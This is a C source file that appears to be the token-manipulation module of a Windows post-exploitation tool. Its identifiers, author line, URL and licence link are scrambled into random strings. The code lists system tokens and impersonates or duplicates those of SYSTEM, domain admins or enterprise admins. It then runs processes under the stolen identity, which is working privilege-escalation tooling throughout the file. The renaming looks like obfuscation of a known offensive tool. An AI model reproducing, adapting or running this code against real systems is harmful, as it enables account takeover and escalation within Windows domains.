/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#include "kcpdclqltoken.h"

const KUHL_M_C kcpdclqlc_token[] = {
	{kcpdclqltoken_whoami,	L"whoami",	L"Display current identity"},
	{kcpdclqltoken_list,		L"list",	L"List all tokens of the system"},
	{kcpdclqltoken_elevate,	L"elevate",	L"Impersonate a token"},
	{kcpdclqltoken_run,		L"run",		L"Run!"},

	{kcpdclqltoken_revert,	L"revert",	L"Revert to proces token"},
};
const KUHL_M kcpdclqltoken = {
	L"token",	L"Token manipulation module", NULL,
	ARRAYSIZE(kcpdclqlc_token), kcpdclqlc_token, NULL, NULL
};

NTSTATUS kcpdclqltoken_whoami(int argc, wchar_t * argv[])
{
	HANDLE hToken;
	kprintf(L" * Process Token : ");
	if(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		kcpdclqltoken_displayAccount(hToken, argc);
		CloseHandle(hToken);
	}
	else PRINT_ERROR_AUTO(L"OpenProcessToken");

	kprintf(L" * Thread Token  : ");
	if(OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken))
	{
		kcpdclqltoken_displayAccount(hToken, argc);
		CloseHandle(hToken);
	}
	else if(GetLastError() == ERROR_NO_TOKEN)
		kprintf(L"no token\n");
	else PRINT_ERROR_AUTO(L"OpenThreadToken");

	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqltoken_list(int argc, wchar_t * argv[])
{
	kcpdclqltoken_list_or_elevate(argc, argv, FALSE, FALSE);
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqltoken_elevate(int argc, wchar_t * argv[])
{
	kcpdclqltoken_list_or_elevate(argc, argv, TRUE, FALSE);
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqltoken_run(int argc, wchar_t * argv[])
{
	kcpdclqltoken_list_or_elevate(argc, argv, FALSE, TRUE);
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqltoken_list_or_elevate(int argc, wchar_t * argv[], BOOL elevate, BOOL runIt)
{
	KUHL_M_TOKEN_ELEVATE_DATA pData = {NULL, NULL, 0, elevate, runIt, NULL, FALSE};
	WELL_KNOWN_SID_TYPE type = WinNullSid;
	PWSTR name, domain;
	PCWSTR strTokenId;
	PPOLICY_DNS_DOMAIN_INFO pDomainInfo = NULL;

	if(runIt)
		ydeuclqlstring_args_byName(argc, argv, L"process", &pData.pCommandLine, L"whoami.exe");
	ydeuclqlstring_args_byName(argc, argv, L"user", &pData.pUsername, NULL);

	if(ydeuclqlstring_args_byName(argc, argv, L"id", &strTokenId, NULL))
	{
		pData.tokenId = wcstoul(strTokenId, NULL, 0);
	}
	else if(ydeuclqlstring_args_byName(argc, argv, L"domainadmin", NULL, NULL))
		type = WinAccountDomainAdminsSid;
	else if(ydeuclqlstring_args_byName(argc, argv, L"enterpriseadmin", NULL, NULL))
		type = WinAccountEnterpriseAdminsSid;
	else if(ydeuclqlstring_args_byName(argc, argv, L"admin", NULL, NULL))
		type = WinBuiltinAdministratorsSid;
	else if(ydeuclqlstring_args_byName(argc, argv, L"localservice", NULL, NULL))
	{
		type = WinLocalServiceSid;
		pData.isSidDirectUser = TRUE;
	}
	else if(ydeuclqlstring_args_byName(argc, argv, L"networkservice", NULL, NULL))
	{
		type = WinNetworkServiceSid;
		pData.isSidDirectUser = TRUE;
	}
	else if((elevate && !pData.pUsername) || ydeuclqlstring_args_byName(argc, argv, L"system", NULL, NULL))
	{
		type = WinLocalSystemSid;
		if(pData.pUsername)
		{
			PRINT_ERROR(L"No username available when SYSTEM\n");
			pData.pUsername = NULL;
		}
	}

	if((type == WinAccountDomainAdminsSid) || (type == WinAccountEnterpriseAdminsSid))
		if(!ydeuclqlnet_getCurrentDomainInfo(&pDomainInfo))
			PRINT_ERROR_AUTO(L"ydeuclqllocal_domain_user_getCurrentDomainSID");

	if(!elevate || !runIt || pData.tokenId || type || pData.pUsername)
	{
		kprintf(L"Token Id  : %u\nUser name : %s\nSID name  : ", pData.tokenId, pData.pUsername ? pData.pUsername : L"");
		if(type)
		{
			if(ydeuclqlnet_CreateWellKnownSid(type, pDomainInfo ? pDomainInfo->Sid : NULL, &pData.pSid))
			{
				if(ydeuclqltoken_getNameDomainFromSID(pData.pSid, &name, &domain, NULL, NULL))
				{
					kprintf(L"%s\\%s\n", domain, name);
					LocalFree(name);
					LocalFree(domain);
				}
				else PRINT_ERROR_AUTO(L"ydeuclqltoken_getNameDomainFromSID");
			}
			else PRINT_ERROR_AUTO(L"ydeuclqllocal_domain_user_CreateWellKnownSid");
		}
		else kprintf(L"\n");
		kprintf(L"\n");
		
		if(!elevate || !runIt || pData.tokenId || pData.pSid || pData.pUsername)
			ydeuclqltoken_getTokensUnique(kcpdclqltoken_list_or_elevate_callback, &pData);
			//ydeuclqltoken_getTokens(kcpdclqltoken_list_or_elevate_callback, &pData);
		
		if(pData.pSid)
			LocalFree(pData.pSid);
		if(pDomainInfo)
			LsaFreeMemory(pDomainInfo);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqltoken_revert(int argc, wchar_t * argv[])
{
	if(SetThreadToken(NULL, NULL))
		kcpdclqltoken_whoami(0, NULL);
	else PRINT_ERROR_AUTO(L"SetThreadToken");
	return STATUS_SUCCESS;
}

void kcpdclqltoken_displayAccount_sids(UCHAR l, DWORD count, PSID_AND_ATTRIBUTES sids)
{
	DWORD i;
	PWSTR name, domainName;
	for(i = 0; i < count; i++)
	{
		kprintf(L"   %c:[%c%c%c%c%c%c%c] ", l,
				(sids[i].Attributes & SE_GROUP_MANDATORY) ? L'M' : L' ',
				(sids[i].Attributes & SE_GROUP_ENABLED_BY_DEFAULT) ? L'D' : L' ',
				(sids[i].Attributes & SE_GROUP_ENABLED) ? L'E' : L' ',
				(sids[i].Attributes & SE_GROUP_OWNER) ? L'O' : L' ',
				(sids[i].Attributes & SE_GROUP_USE_FOR_DENY_ONLY) ? L'U' : L' ',
				(sids[i].Attributes & SE_GROUP_LOGON_ID) ? L'L' : L' ',
				(sids[i].Attributes & SE_GROUP_RESOURCE) ? L'R' : L' '
				);
		if(ydeuclqltoken_getNameDomainFromSID(sids[i].Sid, &name, &domainName, NULL, NULL))
		{
			if(lstrlen(domainName))
				kprintf(L"%s\\", domainName);
			kprintf(L"%s\n", name);
			LocalFree(name);
			LocalFree(domainName);
		}
		else
		{
			ydeuclqlstring_displaySID(sids[i].Sid);
			kprintf(L"\n");
		}
	}
}
const wchar_t * KUHL_M_TOKEN_IMPERSONATION_LEVEL[] = {L"Anonymous", L"Identification", L"Impersonation", L"Delegation",};
const wchar_t * KUHL_M_TOKEN_TYPE[] = {L"Unknown", L"Primary", L"Impersonation",};
void kcpdclqltoken_displayAccount(HANDLE hToken, BOOL full)
{
	TOKEN_STATISTICS tokenStats;
	PWSTR name, domainName, sid;
	TOKEN_ELEVATION_TYPE type;
	DWORD i, szNeeded;
	PTOKEN_GROUPS_AND_PRIVILEGES p;

	if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(TOKEN_STATISTICS), &szNeeded))
	{
		kprintf(L"{%x;%08x} ", tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart);
		if(GetTokenInformation(hToken, TokenSessionId, &i, sizeof(DWORD), &szNeeded))
			kprintf(L"%u ", i);
		else kprintf(L"- ");

		if(GetTokenInformation(hToken, TokenElevationType, &type, sizeof(TOKEN_ELEVATION_TYPE), &szNeeded))
			kprintf(L"%c ", ((type == TokenElevationTypeDefault) ? L'D' : ((type == TokenElevationTypeFull) ? L'F' : (type == TokenElevationTypeLimited) ? L'L' : L'?')));
		else kprintf(L"- ");


		kprintf(L"%-10u\t", tokenStats.TokenId.LowPart);
		if(ydeuclqltoken_getNameDomainFromToken(hToken, &name, &domainName, &sid, NULL))
		{
			kprintf(L"%s\\%s\t%s", domainName, name, sid);
			LocalFree(name);
			LocalFree(domainName);
			LocalFree(sid);
		}
		kprintf(L"\t(%02ug,%02up)\t%s", tokenStats.GroupCount, tokenStats.PrivilegeCount, KUHL_M_TOKEN_TYPE[tokenStats.TokenType]);
		if(tokenStats.TokenType == TokenImpersonation)
			kprintf(L" (%s)", KUHL_M_TOKEN_IMPERSONATION_LEVEL[tokenStats.ImpersonationLevel]);
		kprintf(L"\n");

		if(full)
		{
			if(!GetTokenInformation(hToken, TokenGroupsAndPrivileges, NULL, 0, &szNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
			{
				if(p = (PTOKEN_GROUPS_AND_PRIVILEGES) LocalAlloc(LPTR, szNeeded))
				{
					if(GetTokenInformation(hToken, TokenGroupsAndPrivileges, p, szNeeded, &szNeeded))
					{
						kcpdclqltoken_displayAccount_sids(L'G', p->SidCount - 1, p->Sids + 1);
						kcpdclqltoken_displayAccount_sids(L'R', p->RestrictedSidCount, p->RestrictedSids);
						for(i = 0; i < p->PrivilegeCount; i++)
						{
							kprintf(L"   P:[%c%c%c%c]    ",
								(p->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) ? L'D' : L' ',
								(p->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? L'E' : L' ',
								(p->Privileges[i].Attributes & SE_PRIVILEGE_REMOVED) ? L'R' : L' ',
								(p->Privileges[i].Attributes & SE_PRIVILEGE_USED_FOR_ACCESS) ? L'A' : L' '
								);
							szNeeded = 0;
							if(!LookupPrivilegeName(NULL, &p->Privileges[i].Luid, NULL, &szNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
							{
								if(name = (PWSTR) LocalAlloc(LPTR, (szNeeded + 1) * sizeof(wchar_t)))
								{
									if(LookupPrivilegeName(NULL, &p->Privileges[i].Luid, name, &szNeeded))
										kprintf(L"%s\n", name);
									LocalFree(name);
								}
							}
							else if(GetLastError() == ERROR_NO_SUCH_PRIVILEGE)
								kprintf(L"{%x; %08x}\n", p->Privileges[i].Luid.HighPart, p->Privileges[i].Luid.LowPart);
							else PRINT_ERROR_AUTO(L"LookupPrivilegeName");
						}
					}
					LocalFree(p);
				}
			}
		}
	}
}

BOOL CALLBACK kcpdclqltoken_list_or_elevate_callback(HANDLE hToken, DWORD ptid, PVOID pvArg)
{
	HANDLE hNewToken;
	TOKEN_STATISTICS tokenStats;
	DWORD szNeeded;
	BOOL isUserOK = TRUE;
	PKUHL_M_TOKEN_ELEVATE_DATA pData = (PKUHL_M_TOKEN_ELEVATE_DATA) pvArg;
	PWSTR name, domainName;
	TOKEN_TYPE ttTarget;
	SECURITY_IMPERSONATION_LEVEL ilTarget;
	PTOKEN_USER pUser;

	if(ptid != GetCurrentProcessId())
	{
		if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(TOKEN_STATISTICS), &szNeeded))
		{
			if(pData->pUsername)
			{
				if(ydeuclqltoken_getNameDomainFromToken(hToken, &name, &domainName, NULL, NULL))
				{
					isUserOK = (_wcsicmp(name, pData->pUsername) == 0);
					LocalFree(name);
					LocalFree(domainName);
				}
			}
			else if(pData->tokenId)
				isUserOK = (pData->tokenId == tokenStats.TokenId.LowPart);
			else if(pData->pSid)
			{
				isUserOK = FALSE;
				if(pData->isSidDirectUser)
				{
					if(pUser = ydeuclqltoken_getUserFromToken(hToken))
					{
						isUserOK = EqualSid(pUser->User.Sid, pData->pSid);
						LocalFree(pUser);
					}
				}
				else ydeuclqltoken_CheckTokenMembership(hToken, pData->pSid, &isUserOK);
			}

			if(isUserOK)
			{
				kprintf(L"%u\t", ptid);
				kcpdclqltoken_displayAccount(hToken, FALSE);
				if(pData->elevateIt)
				{
					ttTarget = TokenImpersonation;
					ilTarget = (tokenStats.TokenType == TokenPrimary) ? SecurityDelegation : tokenStats.ImpersonationLevel;
				}
				else if(pData->runIt)
				{
					ttTarget = TokenPrimary;
					ilTarget = SecurityAnonymous;
				}

				if(pData->elevateIt ||  pData->runIt)
				{
					if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE | (pData->runIt ? (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID) : 0), NULL, ilTarget, ttTarget, &hNewToken))
					{
						if(pData->elevateIt)
						{
							if(SetThreadToken(NULL, hNewToken))
							{
								kprintf(L" -> Impersonated !\n");
								kcpdclqltoken_whoami(0, NULL);
								isUserOK = FALSE;
							}
							else PRINT_ERROR_AUTO(L"SetThreadToken");
						}
						else if(pData->runIt)
							isUserOK = !ydeuclqlprocess_run_data(pData->pCommandLine, hNewToken);

						CloseHandle(hNewToken);
					}
				}
			}
			else isUserOK = TRUE;
		}
	}
	return isUserOK;
}